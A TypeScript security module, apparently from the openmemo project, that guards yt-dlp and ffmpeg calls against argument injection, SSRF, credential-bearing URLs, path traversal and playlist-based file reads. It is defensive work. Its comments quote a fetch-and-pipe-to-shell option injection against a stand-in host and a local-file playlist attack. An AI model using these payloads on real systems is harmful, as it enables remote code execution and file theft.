/**
 * Argument-injection defence. D-01 §8.4 layers 3 and 6, plus §8.5 path guards.
 *
 * THREAT MODEL — the thing this file exists to stop:
 *   A user pastes a "URL" into the web UI. That string ends up in the argv of `yt-dlp`
 *   or `ffmpeg`. `shell: false` kills classic shell injection (`;`, `$( )`, backticks,
 *   pipes) but it does NOT stop ARGUMENT injection: an argv element beginning with `-`
 *   is still parsed as an OPTION by the target program. `--exec=curl evil.sh|sh` is a
 *   perfectly valid "URL" as far as the shell is concerned, because no shell is involved.
 *
 * The layers are numbered to match D-01 §8. Every one of them has a matching attack
 * case in subprocess/__tests__/argGuard.test.ts — a layer with no test proving it works
 * is a comment, not a defence.
 */

/*
 * ★ 只导入 `posix` / `win32` 两个**显式**命名空间，**刻意不导入**宿主绑定的
 * `isAbsolute` / `relative` / `resolve`。这不是洁癖：假绿灯家族第 8 例
 * （`isSafeExecutable` 用宿主 `path.isAbsolute` 判 Windows 路径 → Linux 上 CVE 分支
 * 不可达）与 T-143 ② 都是"顺手用了宿主那一份"造成的。名字不在作用域里，就不会顺手。
 */
import { posix, win32 } from 'node:path';
import { realpath } from 'node:fs/promises';

import {
  PIPELINE_MEDIA_EXTENSIONS,
  PLAYLIST_EXTENSIONS as SHARED_PLAYLIST_EXTENSIONS,
} from '@openmemo/shared';

/** D-01 §8.4 L3.6 — URLs longer than this are rejected outright. */
export const MAX_URL_BYTES = 2048;

/** D-01 §8.4 L4 — whisper `--prompt` is user-controlled; truncate hard. */
export const MAX_PROMPT_CHARS = 1024;

export type GuardFailure = {
  ok: false;
  /** Stable machine-readable code so the UI can explain and the tests can assert. */
  code: GuardFailureCode;
  message: string;
};

export type GuardFailureCode =
  | 'not_a_string'
  | 'too_long'
  | 'control_characters'
  | 'unparseable_url'
  | 'bad_scheme'
  | 'embedded_credentials'
  | 'private_address'
  | 'leading_dash'
  | 'empty'
  | 'path_escape'
  | 'unsafe_executable';

export type GuardResult<T> = { ok: true; value: T } | GuardFailure;

const fail = (code: GuardFailureCode, message: string): GuardFailure => ({ ok: false, code, message });

// =========================================================================================
// LAYER 3 — argument injection: user input must never be mistaken for an option
// =========================================================================================

/**
 * L3.4 — reject anything starting with `-`.
 *
 * We do this EVEN THOUGH we also pass `--`. Defence in depth: R-02/D-01 verified that
 * yt-dlp's usage synopsis is `yt-dlp [OPTIONS] [--] URL [URL...]` so `--` is officially
 * supported, but yt-dlp publishes no security guarantees about it, and other tools we
 * add later may not honour it at all. This check does not depend on the target program
 * being well-behaved.
 */
export function rejectsLeadingDash(value: string): boolean {
  return value.startsWith('-');
}

/**
 * L3.6 — control characters, newlines and NUL never belong in a URL or a filename.
 *
 * ⚠️ 这三个字符**必须写成转义序列**，不许写成字面控制字节。
 *
 * 此前这一行里是三个**真的** `0x00` / `0x1f` / `0x7f` 字节（语义完全相同，
 * `[实测]` 全码点空间逐点比对 0 处差异）。后果与语义无关，在**工具**上：
 * GNU grep 见到 NUL 就把整个文件判为 binary，`grep -r` 于是**一声不响地跳过它**
 * （不是报错，是没有输出）。也就是说 —— 本仓库最该被审计的那个文件
 * （参数注入防线、SSRF 判定、媒体扩展名白名单全在这里），
 * **对每一次 grep 式审计都是隐形的**。
 *
 * 这与 ⑤G（`.gitignore` 少一个前导斜杠 → Tailwind 与 git 都跳过那个目录）
 * 是同一个形状：**让工具静默忽略源码**，而不是让它报错。
 * 守卫见 `__tests__/sourceIsGreppable.test.ts`。
 */
// eslint-disable-next-line no-control-regex
const CONTROL_CHARS = /[\x00-\x1f\x7f]/;

/**
 * Private, loopback, link-local and cloud-metadata ranges.
 *
 * L3.3 — this is the SSRF guard. Without it a user can point the downloader at
 * 169.254.169.254 (AWS/GCE metadata) or at 127.0.0.1:<some other local service> and use
 * our daemon as a confused deputy. Note our own daemon binds 127.0.0.1, so loopback is
 * an especially real target.
 */
export function isPrivateOrReservedHost(hostname: string): boolean {
  const host = hostname.toLowerCase().replace(/^\[|\]$/g, '');

  if (host === 'localhost' || host.endsWith('.localhost')) return true;
  /*
   * Common internal TLDs; not exhaustive.
   *
   * ⚠️ This comment used to point the reader at a `resolveAndCheck` below.
   * THERE IS NO SUCH FUNCTION — `[实测 grep]` the name appeared exactly once in the whole
   * repo, in that comment itself. It named a connect-time re-check that was never
   * written, inside the SSRF guard, where a reader has every reason to trust it.
   *
   * What actually exists is `assertHostNotPrivate` below, and it is a PRE-FLIGHT lookup,
   * not a connect-time re-check: it resolves the hostname, checks the answers, and
   * returns — the fetch that follows resolves again, on its own. So DNS rebinding is a
   * real open gap (D-06 §9), not a covered one.
   */
  if (host.endsWith('.local') || host.endsWith('.internal')) return true;

  // --- IPv4 -----------------------------------------------------------------------------
  const v4 = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.exec(host);
  if (v4 !== null) {
    const o = v4.slice(1, 5).map(Number);
    if (o.some((n) => n > 255)) return true; // malformed => reject
    const [a, b] = o as [number, number, number, number];
    if (a === 0) return true; // 0.0.0.0/8
    if (a === 10) return true; // 10/8
    if (a === 127) return true; // loopback
    if (a === 169 && b === 254) return true; // link-local + metadata
    if (a === 172 && b >= 16 && b <= 31) return true; // 172.16/12
    if (a === 192 && b === 168) return true; // 192.168/16
    if (a === 100 && b >= 64 && b <= 127) return true; // CGNAT 100.64/10
    if (a === 192 && b === 0) return true; // 192.0.0/24, 192.0.2/24
    if (a >= 224) return true; // multicast + reserved
    return false;
  }

  // --- IPv6 -----------------------------------------------------------------------------
  if (host.includes(':')) {
    if (host === '::' || host === '::1') return true;
    if (host.startsWith('fe80')) return true; // link-local
    if (/^f[cd]/.test(host)) return true; // fc00::/7 unique-local
    // IPv4-mapped (::ffff:127.0.0.1) — recurse on the embedded v4 literal.
    const mapped = /::ffff:(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})$/i.exec(host);
    if (mapped?.[1] !== undefined) return isPrivateOrReservedHost(mapped[1]);
    return false;
  }

  return false;
}

export interface SafeUrl {
  href: string;
  hostname: string;
  protocol: 'http:' | 'https:';
}

/**
 * L3.1–L3.6 in order. Returns the normalised URL only if every check passes.
 *
 * Deliberately returns `url.href` (the WHATWG-normalised form) rather than the raw
 * input, so what we validated is exactly what we pass to the subprocess. Validating one
 * string and passing a different one is a classic bypass.
 */
export function validateHttpUrl(input: unknown): GuardResult<SafeUrl> {
  if (typeof input !== 'string') return fail('not_a_string', 'URL must be a string');

  const trimmed = input.trim();
  if (trimmed.length === 0) return fail('empty', 'URL is empty');

  // L3.6 — length is checked in BYTES, not characters: a 2048-char string of 4-byte
  // emoji is 8 KB of argv.
  if (Buffer.byteLength(trimmed, 'utf8') > MAX_URL_BYTES) {
    return fail('too_long', `URL exceeds ${MAX_URL_BYTES} bytes`);
  }

  // L3.6 — control chars. Checked BEFORE parsing: `new URL()` silently strips tabs and
  // newlines, so parsing first would launder a hostile string into a clean-looking one.
  if (CONTROL_CHARS.test(trimmed)) {
    return fail('control_characters', 'URL contains control characters');
  }

  // L3.4 — leading dash. Also checked before parsing, because `-x https://ok` would
  // otherwise never reach this test.
  if (rejectsLeadingDash(trimmed)) {
    return fail('leading_dash', 'input may not begin with "-"');
  }

  // L3.1 — must parse, and must be http(s). Rejects file:, ftp:, data:, javascript:.
  let url: URL;
  try {
    url = new URL(trimmed);
  } catch {
    return fail('unparseable_url', 'URL could not be parsed');
  }

  if (url.protocol !== 'http:' && url.protocol !== 'https:') {
    return fail('bad_scheme', `scheme "${url.protocol}" is not allowed (http/https only)`);
  }

  // L3.2 — credentials in the URL. These leak into logs and into yt-dlp's netrc handling.
  if (url.username !== '' || url.password !== '') {
    return fail('embedded_credentials', 'URL must not contain credentials');
  }

  // L3.3 — SSRF. This is the literal-IP check only. Hostnames are NOT re-checked at
  // connect time (this line used to claim they were); callers that go on to fetch must
  // call `assertHostNotPrivate` themselves, and even that is pre-flight — see its
  // docblock for the TOCTOU gap it does not close.
  if (isPrivateOrReservedHost(url.hostname)) {
    return fail('private_address', `host "${url.hostname}" resolves to a private or reserved address`);
  }

  return { ok: true, value: { href: url.href, hostname: url.hostname, protocol: url.protocol } };
}

/**
 * DNS-rebinding follow-up for hostnames.
 *
 * `validateHttpUrl` can only check literal IPs. A hostname that resolves to 127.0.0.1 is
 * still an SSRF. Call this before actually fetching.
 *
 * HONEST LIMITATION: this is TOCTOU-vulnerable — an attacker controlling DNS can answer
 * differently between our lookup and the fetch. Fully closing it requires pinning the
 * resolved IP into the connection (custom agent / `lookup` hook). Recorded in D-06 §9 as
 * a known gap rather than papered over.
 */
export async function assertHostNotPrivate(hostname: string): Promise<GuardResult<string[]>> {
  if (isPrivateOrReservedHost(hostname)) {
    return fail('private_address', `host "${hostname}" is private or reserved`);
  }
  const { lookup } = await import('node:dns/promises');
  try {
    const records = await lookup(hostname, { all: true });
    const addresses = records.map((r) => r.address);
    for (const addr of addresses) {
      if (isPrivateOrReservedHost(addr)) {
        return fail('private_address', `host "${hostname}" resolves to private address ${addr}`);
      }
    }
    return { ok: true, value: addresses };
  } catch {
    // Resolution failure is not a security failure; let the fetch report it.
    return { ok: true, value: [] };
  }
}

// =========================================================================================
// LAYER 6 — the invariant
// =========================================================================================

/**
 * D-01 §8.4 L6, the rule that generalises to tools we have not written yet:
 *
 *   "Any user-controlled string may only be passed as one complete, standalone argv
 *    element. It may never be concatenated into another argument, and may never become
 *    an argument NAME."
 *
 * `buildArgv` is the only sanctioned way to assemble a command line in this package. It
 * physically separates trusted flags from untrusted operands and inserts `--` between
 * them, so the shape of the call enforces the invariant rather than relying on review.
 */
export interface ArgvSpec {
  /** Fixed, developer-authored flags. Never contains user data. */
  flags: string[];
  /** User-controlled operands. Each becomes exactly one argv element, after `--`. */
  operands: string[];
  /** Emit the `--` end-of-options marker. Default true. */
  useDoubleDash?: boolean;
}

export function buildArgv(spec: ArgvSpec): GuardResult<string[]> {
  const { flags, operands, useDoubleDash = true } = spec;

  for (const operand of operands) {
    if (typeof operand !== 'string') return fail('not_a_string', 'operand must be a string');
    if (operand.length === 0) return fail('empty', 'operand is empty');
    if (CONTROL_CHARS.test(operand)) {
      return fail('control_characters', 'operand contains control characters');
    }
    // L3.4 again, at the choke point. Belt and braces with `--`.
    if (rejectsLeadingDash(operand)) {
      return fail('leading_dash', `operand "${operand.slice(0, 40)}" begins with "-"`);
    }
  }

  return { ok: true, value: [...flags, ...(useDoubleDash && operands.length > 0 ? ['--'] : []), ...operands] };
}

/** L4 — user-controlled prompt text, truncated so it cannot blow out argv limits. */
export function safePrompt(prompt: string | undefined): string | null {
  if (prompt === undefined) return null;
  const cleaned = prompt.replace(CONTROL_CHARS, ' ').trim();
  if (cleaned.length === 0) return null;
  return cleaned.slice(0, MAX_PROMPT_CHARS);
}

// =========================================================================================
// LAYER 2 — executables
// =========================================================================================

/**
 * L2 (Windows half) — reject `.bat` / `.cmd` / `.ps1`.
 *
 * Node on Windows CANNOT run a batch file without going through `cmd.exe`, which
 * re-introduces shell metacharacter parsing on the arguments. That is precisely the
 * mechanism behind CVE-2024-27980. Since the whole design rests on `shell: false`, the
 * only way to keep that promise is to refuse to execute anything that requires a shell.
 */
const WINDOWS_SHELL_EXTENSIONS = ['.bat', '.cmd', '.ps1', '.com', '.vbs', '.js'];

export function isSafeExecutable(binPath: string, platform: NodeJS.Platform = process.platform): GuardResult<string> {
  if (typeof binPath !== 'string' || binPath.length === 0) {
    return fail('not_a_string', 'executable path must be a non-empty string');
  }

  // The shell-extension check runs FIRST so the caller gets the security-relevant reason
  // rather than a generic path complaint.
  if (platform === 'win32') {
    const lower = binPath.toLowerCase();
    for (const ext of WINDOWS_SHELL_EXTENSIONS) {
      if (lower.endsWith(ext)) {
        return fail(
          'unsafe_executable',
          `refusing to execute "${ext}" on Windows: it requires cmd.exe and reopens ` +
            `shell metacharacter parsing (CVE-2024-27980). Only .exe is permitted.`,
        );
      }
    }
  }

  // Must use the TARGET platform's rules, not the host's.
  //
  // BUG THIS FIXES (caught by argGuard.test.ts): `path.isAbsolute` is bound to the host
  // OS. Called on Linux, `isAbsolute('C:\\tools\\yt-dlp.exe')` is false, so a Windows
  // path was rejected as a traversal attempt and the CVE-2024-27980 branch was
  // unreachable in tests — the .bat test had been passing for the wrong reason.
  const absolute = platform === 'win32' ? win32.isAbsolute(binPath) : posix.isAbsolute(binPath);
  if (!absolute) {
    return fail('path_escape', 'executable must be an absolute path (PATH is never searched)');
  }

  return { ok: true, value: binPath };
}

// =========================================================================================
// LAYER 7 (D-01 §8.5) — path traversal
// =========================================================================================

/**
 * Confine a path to a managed root.
 *
 * Uses realpath so a symlink inside the root that points outside it is caught — resolving
 * lexically only (path.resolve) is the classic mistake here.
 *
 * NOTE: this is still TOCTOU-prone by nature. D-01 §8.5 step 5 requires callers that go
 * on to read the file to open() immediately and work from the fd. Recorded in D-06 §9.
 *
 * ─── T-143 ②: `platform` is a PARAMETER, for the same reason it is on `isSafeExecutable`
 *
 * This function used to read the host's `process.platform` and use the host-bound
 * `path.relative` / `path.isAbsolute`. That is bug #8 of the false-green family, left
 * untouched in the function next door: `isSafeExecutable` was fixed, `assertWithinRoot`
 * was not, because nobody went back to check the rest of the family.
 *
 * To be precise about what was and was not broken (the distinction matters):
 *   - On WINDOWS the UNC / drive-relative branch DID fire — `process.platform` is
 *     'win32' there. This was never an exploitable hole on Windows.
 *   - On LINUX the branch is unreachable, so it has NEVER been executed by any test.
 *     `\\server\share\evil` resolved to `<root>/\\server\share\evil` — a file with
 *     backslashes in its name, INSIDE the root. Odd, but not an escape.
 *
 * So the defect is "an untested, unreachable security branch", not "Linux is exposed".
 * That is exactly what bug #8 was, and it is worth the same fix: make the target
 * platform an input so both halves can be executed on this machine.
 *
 * `realpath` is unavoidably host-bound (there is no such thing as realpath'ing a Windows
 * path on Linux). Passing a non-host `platform` therefore exercises the LEXICAL guards
 * only — which is precisely the half that was unreachable.
 */
export async function assertWithinRoot(
  managedRoot: string,
  candidate: string,
  platform: NodeJS.Platform = process.platform,
): Promise<GuardResult<string>> {
  if (typeof candidate !== 'string' || candidate.length === 0) {
    return fail('not_a_string', 'path must be a non-empty string');
  }
  if (CONTROL_CHARS.test(candidate)) {
    return fail('control_characters', 'path contains control characters');
  }

  // Must use the TARGET platform's rules, not the host's — same lesson as isSafeExecutable.
  const p = platform === 'win32' ? win32 : posix;

  // Windows: reject UNC and drive-relative forms before anything else.
  if (platform === 'win32') {
    if (/^\\\\/.test(candidate) || /^[a-z]:[^\\/]/i.test(candidate)) {
      return fail('path_escape', 'UNC and drive-relative paths are not allowed');
    }
  }

  const rootResolved = await realpathOrResolve(p.resolve(managedRoot));
  // ★★ T-145：候选必须相对**已经 realpath 过的 root** 展开，不能相对原始的 managedRoot。
  //
  // 这条是 CI 在 macOS 上先红出来、然后在本机用软链根复现出来的（见下面的实测）。
  // 症状极其阴险：**已存在的文件正常，而任何"即将创建"的文件被判为越界。**
  //
  // 机制：`realpathOrResolve` 对不存在的路径**回退到词法绝对路径**（这是对的，
  // 文件还没创建时没法 realpath）。于是当 root 本身在一条软链后面时，比较的两边
  // 走了不同的分支 ——
  //     rootResolved = realpath(...)  → /private/var/…/X     （root 存在，走 realpath）
  //     target       = 词法回退        → /var/…/X/new.wav     （文件不存在，不走 realpath）
  // 两者 `relative()` 出来以 `..` 开头 → path_escape。
  //
  // 为什么偏偏在 macOS 上炸：**macOS 的 `/var` 与 `/tmp` 本身就是软链**
  // （→ `/private/var`、`/private/tmp`），所以默认 TMPDIR 就满足触发条件，
  // 用户完全不需要做任何特殊操作。Linux 上要自己造一条软链才看得见。
  //
  // `[实测]` 在本机（Linux）用 `linkroot -> realroot` 复现，修复前：
  //     exists.wav     {"ok":true, …/realroot/exists.wav}     ← 已存在 → 正常
  //     newfile.wav    {"ok":false,"code":"path_escape"}       ← ★ 错的
  //     sub/new.wav    {"ok":false,"code":"path_escape"}       ← ★ 错的
  //     ../escape      {"ok":false,"code":"path_escape"}       ← 对的
  //     /etc/hostname  {"ok":false,"code":"path_escape"}       ← 对的
  //
  // 安全性**没有放松**，三条都还在：
  //   · 绝对路径候选：`resolve(rootResolved, '/etc/passwd')` 仍然是 `/etc/passwd` → 拦
  //   · `../` 穿越：词法展开后仍然跑到 root 外 → 拦
  //   · root 内指向 root 外的软链：target 存在，仍然走 realpath → 拦
  // 变的只有一件事：**比较的两边现在处在同一个"是否 realpath 过"的坐标系里。**
  const target = await realpathOrResolve(p.resolve(rootResolved, candidate));

  const rel = p.relative(rootResolved, target);
  if (rel === '' || rel.startsWith('..') || p.isAbsolute(rel)) {
    return fail('path_escape', `path escapes the managed root: ${candidate}`);
  }
  return { ok: true, value: target };
}

/**
 * realpath when the path exists; the already-resolved lexical path when it does not
 * (e.g. a file about to be created).
 *
 * Takes an ALREADY-ABSOLUTE path on purpose: it used to call the host-bound
 * `resolve(p)` in the fallback, which would rewrite a win32 path like `C:\root\x`
 * into `<cwd>/C:\root\x` whenever the caller is not actually on Windows.
 */
async function realpathOrResolve(absolute: string): Promise<string> {
  try {
    return await realpath(absolute);
  } catch {
    return absolute;
  }
}

/**
 * Playlist/manifest formats.
 *
 * These are NOT media files — they are lists of URIs that ffmpeg will go and fetch. That
 * makes them an indirection primitive, which is why they get separate treatment from
 * every other extension (see isLocalImportSafeExtension).
 *
 * ★ T-152: the list itself now lives in `@openmemo/shared/media-extensions.ts`. Re-exported
 * here under the historical name because `packages/pipeline/src/index.ts` exports it and
 * there are callers outside this package.
 */
export const PLAYLIST_EXTENSIONS = SHARED_PLAYLIST_EXTENSIONS;

/**
 * Extension allowlist. D-01 §8.5 — true type is confirmed later by ffprobe.
 *
 * ★ T-152: this used to be a hand-copied 24-entry literal, one of THREE diverging copies
 * in the repo. `[实测]` `daemon ∖ pipeline = {mpeg, mpg}` — files the upload endpoint
 * happily accepted were not in this allowlist. It is now the union built in
 * `@openmemo/shared` (UPLOAD ∪ PLAYLIST ∪ SUBTITLE ∪ pipeline-only), so that particular
 * one-way gap is **structurally impossible**: anything the upload endpoint accepts is in
 * here by construction, not by somebody remembering to sync a second list.
 */
export const MEDIA_EXTENSIONS = PIPELINE_MEDIA_EXTENSIONS;

export function hasAllowedMediaExtension(name: string): boolean {
  const dot = name.lastIndexOf('.');
  if (dot < 0) return false;
  return MEDIA_EXTENSIONS.has(name.slice(dot).toLowerCase());
}

export function isPlaylistExtension(name: string): boolean {
  const dot = name.lastIndexOf('.');
  if (dot < 0) return false;
  return PLAYLIST_EXTENSIONS.has(name.slice(dot).toLowerCase());
}

/**
 * May this file be imported from the local filesystem?
 *
 * MEASURED ATTACK (T-026): a local `.m3u8` whose segment URI is `file:///tmp/secret.ts`
 * makes ffmpeg open that path — verified in the log as
 * `Opening 'file:///tmp/attack/secret.ts' for reading`. The local import path must pass
 * `-protocol_whitelist file` for ordinary media to work at all, so the protocol
 * whitelist CANNOT stop this one; the playlist is reading a local file through a
 * protocol that is legitimately enabled.
 *
 * That defeats `assertWithinRoot`: the playlist, not the path, becomes the escape.
 * Remote playlists are unaffected (their whitelist has no `file`), so HLS-over-HTTP
 * still works — only local playlist IMPORT is refused.
 */
export function isLocalImportSafeExtension(name: string): boolean {
  return hasAllowedMediaExtension(name) && !isPlaylistExtension(name);
}
